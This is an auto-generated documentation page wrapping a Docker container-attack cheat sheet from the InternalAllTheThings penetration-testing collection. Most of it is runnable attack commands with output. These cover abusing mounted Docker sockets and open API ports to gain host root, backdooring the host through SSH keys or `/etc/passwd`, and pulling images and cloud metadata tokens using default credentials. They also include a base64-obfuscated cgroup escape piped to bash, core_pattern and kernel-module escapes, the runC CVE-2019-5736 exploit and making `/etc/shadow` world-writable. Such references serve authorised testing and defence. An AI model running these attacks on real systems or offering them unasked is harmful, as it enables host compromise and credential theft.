---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Docker

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-containers-docker` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/containers/docker.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Docker](../../topics/containers/docker.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-containers-docker |
| name | Docker |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/containers/docker.md |

## Preserved Source Material

````yaml
_body: "# Docker\n\n> Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver\
  \ software in packages called containers.\n\n## Summary\n\n- [Tools](#tools)\n- [Mounted Docker Socket](#mounted-docker-socket)\n\
  - [Open Docker API Port](#open-docker-api-port)\n- [Insecure Docker Registry](#insecure-docker-registry)\n- [Exploit privileged\
  \ container abusing the Linux cgroup v1](#exploit-privileged-container-abusing-the-linux-cgroup-v1)\n    - [Abusing CAP_SYS_ADMIN\
  \ capability](#abusing-cap_sys_admin-capability)\n    - [Abusing coredumps and core_pattern](#abusing-coredumps-and-core_pattern)\n\
  - [Breaking out of Docker via runC](#breaking-out-of-docker-via-runc)\n- [Breaking out of containers using a device file](#breaking-out-of-containers-using-a-device-file)\n\
  - [References](#references)\n\n## Tools\n\n- [kost/dockscan](https://github.com/kost/dockscan) : Dockscan is security vulnerability\
  \ and audit scanner for Docker installations\n\n    ```powershell\n    dockscan unix:///var/run/docker.sock\n    dockscan\
  \ -r html -o myreport -v tcp://example.com:5422\n    ```\n\n- [stealthcopter/deepce](https://github.com/stealthcopter/deepce)\
  \ : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)\n\n    ```powershell\n    ./deepce.sh \n\
  \    ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce\n    ./deepce.sh --no-enumeration\
  \ --exploit SOCK --shadow\n    ./deepce.sh --no-enumeration --exploit DOCKER --command \"whoami>/tmp/hacked\"\n    ```\n\
  \n- [orisano/dlayer](https://github.com/orisano/dlayer) : dlayer is docker layer analyzer.\n\n    ```powershell\n    docker\
  \ pull orisano/dlayer\n    docker save image:tag | dlayer -i\n    ```\n\n- [wagoodman/dive](https://github.com/wagoodman/dive)\
  \ : A tool for exploring each layer in a docker image\n\n    ```powershell\n    alias dive=\"docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock\
  \ wagoodman/dive\"\n    dive <your-image-tag>\n    ```\n\n## Mounted Docker Socket\n\nPrerequisite:\n\n- Socker mounted\
  \ as volume : `- \"/var/run/docker.sock:/var/run/docker.sock\"`\n\nUsually found in `/var/run/docker.sock`, for example\
  \ for Portainer.\n\n```powershell\ncurl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json\ncurl -XPOST\
  \ –unix-socket /var/run/docker.sock -d '{\"Image\":\"nginx\"}' -H 'Content-Type: application/json' http://localhost/containers/create\n\
  curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start\n```\n\nExploit\
  \ using [brompwnie/ed](https://github.com/brompwnie/ed)\n\n```powershell\nroot@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/\
  \ -autopwn=true        \n[+] Hunt dem Socks\n[+] Hunting Down UNIX Domain Sockets from: /var/run/\n[*] Valid Socket: /var/run/docker.sock\n\
  [+] Attempting to autopwn\n[+] Hunting Docker Socks\n[+] Attempting to Autopwn:  /var/run/docker.sock\n[*] Getting Docker\
  \ client...\n[*] Successfully got Docker client...\n[+] Attempting to escape to host...\n[+] Attempting in TTY Mode\nchroot\
  \ /host && clear\necho 'You are now on the underlying host'\nchroot /host && clear\necho 'You are now on the underlying\
  \ host'\n/ # chroot /host && clear\n/ # echo 'You are now on the underlying host'\nYou are now on the underlying host\n\
  / # id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n\
  ```\n\n## Open Docker API Port\n\nPrerequisite:\n\n- Docker runned with `-H tcp://0.0.0.0:XXXX`\n\n```powershell\n$ nmap\
  \ -sCV 10.10.10.10 -p 2376\n2376/tcp open  docker  Docker 19.03.5\n| docker-version:\n|   Version: 19.03.5\n|   MinAPIVersion:\
  \ 1.12\n```\n\nMount the current system inside a new \"temporary\" Ubuntu container, you will gain root access to the filesystem\
  \ in `/mnt`.\n\n```powershell\n$ export DOCKER_HOST=tcp://10.10.10.10:2376\n$ docker run --name ubuntu_bash --rm -i -v /:/mnt\
  \ -u 0  -t ubuntu bash\nor\n$ docker -H  open.docker.socket:2375 ps\n$ docker -H  open.docker.socket:2375 exec -it mysql\
  \ /bin/bash\nor \n$ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq\n$ curl –insecure -X POST -H \"Content-Type:\
  \ application/json\" https://tls-opendocker.socket2376/containers/create?name=test -d '{\"Image\":\"alpine\", \"Cmd\":[\"\
  /usr/bin/tail\", \"-f\", \"1234\", \"/dev/null\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}'\n```\n\nFrom there\
  \ you can backdoor the filesystem by adding an ssh key in `/root/.ssh` or adding a new root user in `/etc/passwd`.\n\n##\
  \ Insecure Docker Registry\n\nDocker Registry’s fingerprint is `Docker-Distribution-Api-Version` header. Then connect to\
  \ Registry API endpoint: `/v2/_catalog`.\n\n```powershell\ncurl https://registry.example.com/v2/<image_name>/tags/list\n\
  docker pull https://registry.example.com:443/<image_name>:<tag>\n\n# connect to the endpoint and list image blobs\ncurl\
  \ -s -k --user \"admin:admin\" https://docker.registry.local/v2/_catalog\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/tags/list\n\
  curl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/manifests/latest\n# download blobs\n\
  curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058'\
  \ > out.tar.gz\n# automated download\nhttps://github.com/NotSoSecure/docker_fetch/\npython /opt/docker_fetch/docker_image_fetch.py\
  \ -u http://admin:admin@docker.registry.local\n```\n\nAccess a private registry and start a container with one of its image\n\
  \n```powershell\ndocker login -u admin -p admin docker.registry.local\ndocker pull docker.registry.local/wordpress-image\n\
  docker run -it docker.registry.local/wordpress-image /bin/bash\n```\n\nAccess a private registry using OAuth Token from\
  \ Google\n\n```powershell\ncurl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email\n\
  curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token \ndocker login -e\
  \ <email> -u oauth2accesstoken -p \"<access token>\" https://gcr.io\n```\n\n## Exploit privileged container abusing the\
  \ Linux cgroup v1\n\nPrerequisite (at least one):\n\n- `--privileged`\n- `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`\
  \ flags.\n\n### Abusing CAP_SYS_ADMIN capability\n\n```powershell\ndocker run --rm -it --cap-add=SYS_ADMIN --security-opt\
  \ apparmor=unconfined ubuntu bash -c 'echo \"cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK\"\
  \ | base64 -d | bash -'\n```\n\nExploit breakdown :\n\n```powershell\n# On the host\ndocker run --rm -it --cap-add=SYS_ADMIN\
  \ --security-opt apparmor=unconfined ubuntu bash\n \n# In the container\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup\
  \ /tmp/cgrp && mkdir /tmp/cgrp/x\n \necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\\
  ).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\n \necho '#!/bin/sh' > /cmd\necho \"ps aux > $host_path/output\"\
  \ >> /cmd\nchmod a+x /cmd\n \nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n```\n\n### Abusing coredumps and core_pattern\n\
  \n1. Find the mounting point using `mount`\n\n    ```ps1\n    $ mount | head -n 1\n    overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work)\n\
  \    ```\n\n2. Create an evil binary at the root of the filesystem: `cp /tmp/poc /poc`\n3. Set the program to be executed\
  \ on the coredumps\n\n    ```ps1\n    echo \"|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc\"\
  \ > /proc/sys/kernel/core_pattern\n    ```\n\n4. Generate a coredump with a faulty program: `gcc -o crash crash.c && ./crash`\n\
  \n    ```cpp\n    int main(void) {\n        char buf[1];\n        for (int i = 0; i < 100; i++) {\n            buf[i] =\
  \ 1;\n        }\n        return 0;\n    }\n    ```\n\n5. Your payload should have been executed on the host\n\n## Breaking\
  \ out of Docker via runC\n\n> The vulnerability allows a malicious container to (with minimal user interaction) overwrite\
  \ the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able\
  \ to run any command ... as root within a container in either of these contexts: Creating a new container using an attacker-controlled\
  \ image. Attaching (docker exec) into an existing container which the attacker had previous write access to.  - Vulnerability\
  \ overview by the runC team\n\nExploit for CVE-2019-5736 : [twistlock/RunC-CVE-2019-5736](https://github.com/twistlock/RunC-CVE-2019-5736)\n\
  \n```powershell\ndocker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC\ndocker run\
  \ --rm cve-2019-5736:malicious_image_POC\n```\n\n## Breaking out of containers using a device file\n\n```powershell\nhttps://github.com/FSecureLABS/fdpasser\n\
  In container, as root: ./fdpasser recv /moo /etc/shadow\nOutside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f\
  \ \"sleep 1337\")/root/moo\nOutside container: ls -la /etc/shadow\nOutput: -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow\n\
  ```\n\n## Breaking out of Docker via kernel modules loading\n\n> When privileged Linux containers attempt to load kernel\
  \ modules, the modules are loaded into the host's kernel (because there is only *one* kernel, unlike VMs). This provides\
  \ a route to an easy container escape.\n\nExploitation:\n\n- Clone the repository : `git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping`\n\
  - Build with `make`\n- Start a privileged docker container with `docker run -it --privileged --hostname docker --mount \"\
  type=bind,src=$PWD,dst=/root\" ubuntu`\n- `cd /root` in the new container\n- Insert the kernel module with `./escape`\n\
  - Run `./execute`!\n\nUnlike other techniques, this module doesn't contain any syscalls hooks, but merely creates two new\
  \ proc files; `/proc/escape` and `/proc/output`.\n\n- `/proc/escape` only answers to write requests and simply executes\
  \ anything that's passed to it via [`call_usermodehelper()`](https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html).\n\
  - `/proc/output` just takes input and stores it in a buffer when written to, then returns that buffer when it's read from\
  \ - essentially acting a like a file that both the container and the host can read/write to.\n\nThe clever part is that\
  \ anything we write to `/proc/escape` gets sandwiched into `/bin/sh -c <INPUT> > /proc/output`. This means that the command\
  \ is run under `/bin/sh` and the output is redirected to `/proc/output`, which we can then read from within the container.\n\
  \nOnce the module is loaded, you can simply `echo \"cat /etc/passwd\" > /proc/escape` and then get the result via `cat /proc/output`.\
  \ Alternatively, you can use the `execute` program to give yourself a makeshift shell (albeit an extraordinarily basic one).\n\
  \nThe only caveat is that we cannot be sure that the container has `kmod` installed (which provides `insmod` and `rmmod`).\
  \ To overcome this, after building the kernel module, we load it's byte array into a C program, which then uses the `init_module()`\
  \ syscall to load the module into the kernel without needing `insmod`. If you're interested, take a look at the Makefile.\n\
  \n## References\n\n- [Hacking Docker Remotely - 17 March 2020 - ch0ks](https://hackarandas.com/blog/2020/03/17/hacking-docker-remotely/)\n\
  - [Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)\n\
  - [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)\n\
  - [Breaking out of Docker via runC – Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)\n\
  - [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)\n\
  - [OWASP - Docker Security CheatSheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md)\n\
  - [Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)\n\
  - [Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping)\n\
  - [Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer](https://pwning.systems/posts/escaping-containers-for-fun/)"
_relative_path: containers/docker.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/containers/docker.md
````
